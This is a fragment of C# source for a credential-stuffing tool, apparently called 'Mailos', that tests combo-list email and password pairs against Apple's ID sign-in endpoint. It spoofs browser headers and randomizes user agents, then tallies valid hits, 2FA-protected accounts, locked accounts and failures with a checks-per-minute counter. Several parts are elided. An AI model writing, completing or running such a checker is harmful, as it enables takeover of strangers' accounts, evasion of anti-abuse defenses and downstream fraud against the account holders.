...
namespace Ebay_Checker
{
    ...
    {
        [STAThread]
        public static void applestart()
        {
            Prsc.gmxapi();
            Export.Initialize();
            Console.Title = "Mailos | Apple";
        fuck:
            Console.Clear();
            ASCII.ASCIII();
            ...
            try
            {
                ...
                Task.Factory.StartNew(() =>
                {
                    for (; ; )
                    {
                        ...
                        Variables.cpm_aux = 0;
                        Colorful.Console.Title = "[Mailos - Apple] | Hits: " + Variables.hit + " | 2FA: " + Variables.free + " | Bads: " + Variables.bad + " | Error: " + Variables.error + " | Checked: " + Variables.check + "/" + Variables.combototal + " | CPM: " + Variables.cpm * 60;
                        Thread.Sleep(1000);
                    }
                });
                    ...
                    try
                    {
                        ...
                        using (HttpRequest httpRequest = new HttpRequest())
                        {
                            ...
                            try
                            {
                                ...
                                string text1 = Http.RandomUserAgent();
                                httpRequest.AddHeader("User-Agent", "" + text1 + "");
                                httpRequest.AddHeader("X-Apple-Locale", "US-EN");
                                httpRequest.AddHeader("Accept", "application/json, text/javascript, */*; q=0.01");
                                httpRequest.AddHeader("X-Requested-With", "XMLHttpRequest");
                                httpRequest.AddHeader("X-Apple-Trusted-Domain", "https://idmsa.apple.com");
                                httpRequest.AddHeader("Origin", "https://idmsa.apple.com");
                                httpRequest.AddHeader("Sec-Fetch-Site", "same-origin");
                                httpRequest.AddHeader("Sec-Fetch-Mode", "cors");
                                httpRequest.AddHeader("Sec-Fetch-Dest", "empty");
                                httpRequest.AddHeader("Referer", "https://idmsa.apple.com/appleauth/auth/signin?widgetKey=92f19b477c5c9be6ab17f3ec2b1b2b7db4d00a9a8c973e3d6c90dac08b91de71&language=US-EN&iframeId=daw-19c26f82-b62c-457b-bdde-57d28cda5218&appId=632");
                                httpRequest.AddHeader("Accept-Encoding", "gzip, deflate, br");
                                httpRequest.AddHeader("Accept-Language", "en-US,en;q=0.9");

                                var res0 = httpRequest.Post("https://idmsa.apple.com/appleauth/auth/signin?isRememberMeEnabled=true", "{\"accountName\":\"" + s[0] + "\",\"rememberMe\":false,\"password\":\"" + s[1] + "\"}", "application/json");
                                string text0 = res0.ToString();

                                if (text0.Contains("Sorry, could not complete request because"))
                                ...
                                if (text0.Contains("This Apple ID has been locked for security reasons."))
                                ...
                                if (text0.Contains("Your Apple ID or password was incorrect"))
